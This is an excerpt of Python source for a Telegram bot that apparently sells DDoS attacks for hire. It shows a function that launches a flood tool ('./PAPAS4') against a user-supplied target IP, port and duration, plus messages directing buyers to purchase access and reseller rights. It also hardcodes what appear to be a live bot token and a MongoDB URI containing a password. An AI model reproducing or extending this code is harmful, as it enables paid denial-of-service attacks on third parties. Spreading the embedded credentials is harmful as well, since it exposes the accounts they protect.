...
TOKEN = '7705637241:AAHd4I2cf2pwQbNmdL934X0MMmKzJXWL8ig'
MONGO_URI = 'mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv'
FORWARD_CHANNEL_ID = -1002337826516
CHANNEL_ID = -1002337826516
error_channel_id = -1002337826516
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./PAPAS4 {target_ip} {target_port} {duration} 900"
    try:
...
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED BUY ACESS:-@DEVILVIPDDOS*", parse_mode='Markdown')
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*FOR RESSELER SHIP DM :-@DEVILVIPDDOS*", parse_mode='Markdown')
...
if __name__ == "__main__":
    ...
    logging.info("DEVIL SERVER RUNNING.....")
    while True:
        try:
